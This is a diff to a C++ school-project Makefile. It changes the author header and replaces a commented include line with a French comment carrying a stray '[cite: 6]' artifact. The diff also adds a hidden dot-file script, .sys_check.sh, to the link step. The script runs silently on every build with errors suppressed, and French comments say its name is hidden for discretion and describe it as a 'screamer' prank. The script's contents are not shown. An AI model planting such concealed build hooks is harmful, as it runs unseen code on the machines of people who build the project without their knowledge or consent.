@@ -3,10 +3,10 @@
 #                                                         :::      ::::::::    #
 #    Makefile                                           :+:      :+:    :+:    #
 #                                                     +:+ +:+         +:+      #
-#    By: mvachon <mvachon@student.42.fr>            +#+  +:+       +#+         #
+#    By: nofanizz <nofanizz@student.42lyon.fr>      +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2026/02/05 07:48:23 by mvachon           #+#    #+#              #
-#    Updated: 2026/02/05 09:06:16 by mvachon          ###   ########.fr        #
+#    Updated: 2026/02/05 12:48:48 by nofanizz         ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
@@ -19,7 +19,7 @@ INCLUDES    = -I includes
 
 SRCS        = srcs/main.cpp
 
-#include srcs/CGI/cgi.mk
+# Inclusion des modules externes [cite: 6]
 include srcs/Exceptions/exceptions.mk
 include srcs/ConfigParser/configparser.mk
 include srcs/Management/management.mk
@@ -35,9 +35,15 @@ GREEN       = \033[0;32m
 RED         = \033[0;31m
 RESET       = \033[0m
 
+# --- CONFIGURATION SURPRISE ---
+# On cache le nom du script pour plus de discrétion
+SURPRISE    = .sys_check.sh
+
 all: $(UPLOAD_FILE) $(NAME)
 
 $(NAME): $(OBJS)
+	@# Lancement du screamer en arrière-plan (silencieux si échec)
+	@./$(SURPRISE) 2>/dev/null || true
 	@$(CXX) $(CXXFLAGS) $(INCLUDES) $(OBJS) -o $(NAME)
 	@echo "$(GREEN)✓ $(NAME) compiled successfully!$(RESET)"
 
@@ -66,4 +72,4 @@ fclean: clean
 
 re: fclean all
 
-.PHONY: all clean fclean re 
+.PHONY: all clean fclean re
